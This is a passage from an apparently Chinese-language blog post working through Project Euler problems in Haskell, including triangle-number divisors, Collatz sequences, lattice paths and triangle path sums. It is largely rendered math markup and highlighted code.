style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mord mathnormal">mn</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9474em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathrm">where</span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p>那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>+</mo><mi>b</mi><mo>+</mo><mi>c</mi><mo>=</mo><mn>2</mn><mi>m</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a+b+c=2m(m+n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 实际上只有很少的选择，再然后考虑去除倍数的影响，确保 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m+n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互素。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">findPythagoreanTripletImproved</span> :: <span class="type">Integer</span> -&gt; <span class="type">Maybe</span> [(<span class="type">Integer</span>, <span class="type">Integer</span>, <span class="type">Integer</span>)]</span><br><span class="line"><span class="title">findPythagoreanTripletImproved</span> totalSum</span><br><span class="line">    | odd totalSum = <span class="type">Nothing</span></span><br><span class="line">    | null candicates = <span class="type">Nothing</span></span><br><span class="line">    | otherwise = <span class="type">Just</span> $ map getSides candicates</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    candicates =</span><br><span class="line">        <span class="keyword">let</span> relativePrimeFac (x, y) = (x `div` d, y `div` d, d ^ <span class="number">2</span>)</span><br><span class="line">              <span class="keyword">where</span></span><br><span class="line">                d = gcd x y</span><br><span class="line">         <span class="keyword">in</span> [relativePrimeFac (a, b) | (a, b) &lt;- factors $ totalSum `div` <span class="number">2</span>, b &lt; <span class="number">2</span> * a]</span><br><span class="line">    getSides (m, k, d) = (d * a, d * b, d * c)</span><br><span class="line">      <span class="keyword">where</span></span><br><span class="line">        n = k - m</span><br><span class="line">        a = m ^ <span class="number">2</span> - n ^ <span class="number">2</span></span><br><span class="line">        b = <span class="number">2</span> * m * n</span><br><span class="line">        c = m ^ <span class="number">2</span> + n ^ <span class="number">2</span></span><br><span class="line"><span class="title">factors</span> :: <span class="type">Integer</span> -&gt; [(<span class="type">Integer</span>, <span class="type">Integer</span>)]</span><br><span class="line"><span class="title">factors</span> x = [(a, x `div` a) | a &lt;- [<span class="number">2</span> .. (floor . sqrt $ fromInteger x)], x `mod` a == <span class="number">0</span>]</span><br></pre></td></tr></table></figure><h1>P12 三角形数的因子个数</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/272d0cc4d5253e7d999bb78672906a9f.png" alt="image-20240114213717924"></p><p>三角形数有特征的，满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">n(n+1)/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/2</span></span></span></span>，然后因子个数实际是质因子的组合，对于每类质因子<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>，如果有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">m_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>个，那就可以选择 0 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">m_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 组成一个因子，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 种选择。为了复用质因数列表，于是用了 State Monad。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">PrimeState</span> = <span class="type">State</span> [<span class="type">Int</span>]</span></span><br><span class="line"><span class="title">firstDivsorsN2</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">firstDivsorsN2</span> num = evalState (findFirstDivisor num) (sieve [<span class="number">2</span> ..])</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    findFirstDivisor :: <span class="type">Int</span> -&gt; <span class="type">PrimeState</span> <span class="type">Int</span></span><br><span class="line">    findFirstDivisor n = head &lt;$&gt; filterM (fmap (&gt; n) &lt;$&gt; divisorNum) triNum</span><br><span class="line"></span><br><span class="line">    divisorNum :: <span class="type">Int</span> -&gt; <span class="type">PrimeState</span> <span class="type">Int</span></span><br><span class="line">    divisorNum m = product &lt;$&gt; (map (succ . length) . group &lt;$&gt; primeFactors m)</span><br><span class="line"></span><br><span class="line">    primeFactors :: <span class="type">Int</span> -&gt; <span class="type">PrimeState</span> [<span class="type">Int</span>]</span><br><span class="line">    primeFactors num = gets $ \ps -&gt; factorize num ps</span><br><span class="line">      <span class="keyword">where</span></span><br><span class="line">        factorize <span class="number">1</span> _ = []</span><br><span class="line">        factorize _ [] = []</span><br><span class="line">        factorize m (p : ps)</span><br><span class="line">          | m `mod` p == <span class="number">0</span> = p : factorize (m `div` p) (p : ps)</span><br><span class="line">          | otherwise = factorize m ps</span><br><span class="line"></span><br><span class="line">    sieve (p : xs) = p : sieve [x | x &lt;- xs, x `mod` p /= <span class="number">0</span>]</span><br><span class="line">    triNum = [m * (m + <span class="number">1</span>) `div` <span class="number">2</span> | m &lt;- [<span class="number">1</span> ..]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>P14 最长 Collatz 序列</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/3613ba29cc8cc23eddaad0fa9d05bf97.png" alt="image-20240114214356024"></p><p>序列长度的递推关系很清晰，但是最好要记录下状态，可以在已有的状态上递推，所以用 State Monad。之后比较长度即可。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#123;-# LANGUAGE TupleSections #-&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> P14 (<span class="title">longestUnder2</span>) <span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Control.Monad.State</span><br><span class="line"><span class="keyword">import</span> Data.List (<span class="title">foldl&#x27;</span>, <span class="title">maximumBy</span>)</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">qualified</span> Data.Map <span class="keyword">as</span> Map</span><br><span class="line"><span class="keyword">import</span> Data.Ord (<span class="title">comparing</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | Finds the starting number under a given limit which produces the longest Collatz sequence.</span></span><br><span class="line"><span class="comment">--   &#x27;n&#x27; is the upper limit for the starting number.</span></span><br><span class="line"><span class="title">longestUnder</span> :: <span class="type">Integer</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">longestUnder</span> n = fst $ maximumBy (comparing snd) $ zip [<span class="number">1</span> .. n] (map collatzLen [<span class="number">1</span> .. (n - <span class="number">1</span>)])</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    <span class="comment">-- \| Computes the length of the Collatz sequence for a given starting number.</span></span><br><span class="line">    collatzLen <span class="number">1</span> = <span class="number">1</span> <span class="comment">-- Base case: sequence length is 1 for starting number 1.</span></span><br><span class="line">    collatzLen start</span><br><span class="line">      | even start = <span class="number">1</span> + collatzLen (start `div` <span class="number">2</span>) <span class="comment">-- If &#x27;start&#x27; is even.</span></span><br><span class="line">      | otherwise = <span class="number">1</span> + collatzLen (<span class="number">3</span> * start + <span class="number">1</span>) <span class="comment">-- If &#x27;start&#x27; is odd.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Type aliases for readability.</span></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">Cache</span> = <span class="type">Map</span>.<span class="type">Map</span> <span class="type">Int</span> <span class="type">Int</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">CollatzState</span> = <span class="type">State</span> <span class="type">Cache</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | An optimized version of &#x27;longestUnder&#x27; using the State Monad for caching.</span></span><br><span class="line"><span class="title">longestUnder2</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">longestUnder2</span> m = fst $ maximumBy (comparing snd) $ evalState (mapM collatzPair [<span class="number">1</span> .. m - <span class="number">1</span>]) <span class="type">Map</span>.empty</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    <span class="comment">-- \| Creates a pair (starting number, sequence length) for each number.</span></span><br><span class="line">    collatzPair :: <span class="type">Int</span> -&gt; <span class="type">CollatzState</span> (<span class="type">Int</span>, <span class="type">Int</span>)</span><br><span class="line">    collatzPair num = (num,) &lt;$&gt; collatzLen num</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Computes the Collatz sequence length with caching.</span></span><br><span class="line">    collatzLen :: <span class="type">Int</span> -&gt; <span class="type">CollatzState</span> <span class="type">Int</span></span><br><span class="line">    collatzLen <span class="number">1</span> = return <span class="number">1</span> <span class="comment">-- Base case: sequence length is 1 for starting number 1.</span></span><br><span class="line">    collatzLen n = <span class="keyword">do</span></span><br><span class="line">      cache &lt;- get</span><br><span class="line">      maybe (updateCache n) return (<span class="type">Map</span>.lookup n cache)</span><br><span class="line">      <span class="keyword">where</span></span><br><span class="line">        <span class="comment">-- \| Updates the cache with the new sequence length if not already cached.</span></span><br><span class="line">        updateCache num = <span class="keyword">do</span></span><br><span class="line">          len &lt;- collatzLen $ <span class="keyword">if</span> even num <span class="keyword">then</span> num `div` <span class="number">2</span> <span class="keyword">else</span> <span class="number">3</span> * num + <span class="number">1</span></span><br><span class="line">          modify (<span class="type">Map</span>.insert num (<span class="number">1</span> + len))</span><br><span class="line">          return (<span class="number">1</span> + len)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | Main function to print the starting number under 1,000,000 with the longest Collatz sequence.</span></span><br><span class="line"><span class="title">main</span> :: <span class="type">IO</span> ()</span><br><span class="line"><span class="title">main</span> = print $ longestUnder2 <span class="number">1000000</span></span><br></pre></td></tr></table></figure><h1>P15 走格子路径的方式</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/485f3873f85f82b0a8c11f0b0e7225bb.png" alt="image-20240114214650028"></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">latticePaths2</span> side = dp !! side !! side</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    dp = [[lattice x y | y &lt;- [<span class="number">0</span> .. side]] | x &lt;- [<span class="number">0</span> .. side]]</span><br><span class="line">    lattice <span class="number">0</span> _ = <span class="number">1</span></span><br><span class="line">    lattice _ <span class="number">0</span> = <span class="number">1</span></span><br><span class="line">    lattice x y = dp !! (x - <span class="number">1</span>) !! y + dp !! x !! (y - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">latticePaths3</span> :: (<span class="type">Integral</span> a) =&gt; a -&gt; a</span><br><span class="line"><span class="title">latticePaths3</span> side = numerator $ product [(side + i) % i | i &lt;- [<span class="number">1</span> .. side]]</span><br></pre></td></tr></table></figure><p>可以直接看代码，每个点的来源是左边或者上面的点，所以动态规划就可以了。不过呢，其实也是有组合公式，因为每个点的路径，实际上是 d(down)r(right)，这样 ddrddrr 的序列组合，这样就到达了(4,3)。7 个位置选出 3 个给 r 就是一种走法。</p><h1>P18 路径之和</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/59169786d2c89f4d5ce3d6f69821d725.png" alt="image-20240114215043832"></p><p>step 函数是从最后一行和倒数第二行开始，计算得到从最后一行到倒数第二行的每个数字最大的和，然后这个列表继续和倒数第三行操作，最后就剩下一个数。记 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 为从上到下到第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 列的数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">n_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的路径之和。那么</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mi>max</mi><mo>⁡</mo><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><mo>+</mo><msub><mi>n</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i,j}=\max{ s_{i-1,j-1}, s_{i-1,j}}+n_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mop">max</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，对了如果下标超出范围，值都是 0。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- | Computes the maximum path sum in a triangle.</span></span><br><span class="line"><span class="comment">--   The triangle is represented as a list of lists, where each list is a row in the triangle.</span></span><br><span class="line"><span class="title">maxPathSum</span> :: [[<span class="type">Int</span>]] -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">maxPathSum</span> [] = <span class="number">0</span> <span class="comment">-- Base case: if the triangle is empty, the max sum is 0.</span></span><br><span class="line"><span class="title">maxPathSum</span> tri = head $ foldr1 step tri</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    <span class="comment">-- \| &#x27;step&#x27; combines two rows of the triangle into one by choosing the maximum adjacent numbers.</span></span><br><span class="line">    <span class="comment">--   It is used as the function in a right fold to accumulate the maximum path sum.</span></span><br><span class="line">    step [] _ = [] <span class="comment">-- Base case for the step function when the last row is empty.</span></span><br><span class="line">    step _ [] = [] <span class="comment">-- Base case for the step function when the next row is empty.</span></span><br><span class="line">    step lastRow@(x : xs) nextRow@(y : ys) =</span><br><span class="line">      (x + max y (head ys)) : step xs ys <span class="comment">-- Calculate the max sum for each position in the row.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#x27;foldr1&#x27; is used to apply &#x27;step&#x27; function starting from the bottom of the triangle,</span></span><br><span class="line"><span class="comment">-- eventually reducing the entire triangle to a single row containing only the max path sum.</span></span><br></pre></td></tr></table></figure><h1>Problem 21 - 40</h1><h1>P21 Amicable Numbers</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/c8a66355fc5c1c3a26f88dad141468f2.png" alt="image-20240114215746348"></p><p>这里实际想要证明，因子之和，其实有一个公式。显然对于质数 <span class="katex"><span class="katex-mathml"><math 